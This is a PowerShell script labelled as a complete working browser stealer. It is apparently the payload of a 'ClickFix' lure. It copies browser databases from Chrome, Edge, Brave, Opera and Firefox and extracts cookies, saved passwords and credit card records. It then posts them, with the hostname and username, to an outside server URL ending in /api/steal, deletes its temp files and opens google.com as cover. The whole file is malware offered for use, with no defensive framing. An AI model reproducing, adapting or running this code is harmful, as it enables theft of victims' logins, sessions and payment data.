# ============================================================
# BROWSER STEALER — COMPLETE WORKING VERSION
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Message, $Color)
    Write-Host $Message -ForegroundColor $Color
}

# ---- LOAD SQLITE ----
$sqliteLoaded = $false
$sqliteType = ""

try {
    Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
    $sqliteLoaded = $true
    $sqliteType = "Microsoft"
    Write-Color "[+] SQLite loaded (Microsoft)" "Green"
} catch {
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        $sqliteLoaded = $true
        $sqliteType = "System"
        Write-Color "[+] SQLite loaded (System)" "Green"
    } catch {
        Write-Color "[!] SQLite not available" "Red"
    }
}

# ---- SQLITE READER ----
function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    if (-not $sqliteLoaded) { return $result }
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $temp -Force
        if ($sqliteType -eq "Microsoft") {
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        } else {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        }
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {}
    return $result
}

# ---- COOKIES ----
function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { return $cookies }
    if (-not $sqliteLoaded) { return $cookies }
    $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
    foreach ($r in $rows) {
        if ($r['name'] -and $r['value']) {
            $d = $r['host_key']
            if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
            $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
        }
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    if (-not $sqliteLoaded) { return $cookies }
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                foreach ($r in $rows) {
                    if ($r['name'] -and $r['value']) {
                        $dmn = $r['host']
                        if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                        $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                    }
                }
            }
        }
    }
    return $cookies
}

# ---- PASSWORDS ----
function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    if (-not $sqliteLoaded) { return $pass }
    $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
    foreach ($r in $rows) {
        if ($r['username_value'] -and $r['password_value']) {
            $u = $r['origin_url']
            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
            $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
        }
    }
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname
                            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $pass
}

# ---- CREDIT CARDS ----
function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    if (-not $sqliteLoaded) { return $cards }
    $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
    foreach ($r in $rows) {
        if ($r['name_on_card'] -and $r['card_number_encrypted']) {
            $cards += @{
                name = $r['name_on_card']
                number = $r['card_number_encrypted']
                month = $r['expiration_month']
                year = $r['expiration_year']
                browser = $Name
            }
        }
    }
    return $cards
}

# ---- MAIN ----
$pc = $env:COMPUTERNAME
$user = $env:USERNAME

Write-Color "" "White"
Write-Color "============================================" "Cyan"
Write-Color "  BROWSER STEALER v3.0" "Green"
Write-Color "  Target: $pc" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color "" "White"

$allCookies = @()
$allPasswords = @()
$allCards = @()

Write-Color "[+] Chrome cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Color "[+] Edge cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Color "[+] Brave cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Color "[+] Opera cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Color "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

Write-Color "[+] Chrome passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Color "[+] Edge passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Color "[+] Brave passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Color "[+] Opera passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"

Write-Color "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

Write-Color "[+] Chrome cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Color "[+] Edge cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Color "[+] Brave cards..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

Write-Color "" "White"
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color "" "White"

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{ hostname = $pc; username = $user }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pc
}

Write-Color "[+] Sending data..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"
Write-Color "" "White"
Write-Color "[+] Done" "Green"
Write-Color "" "White"
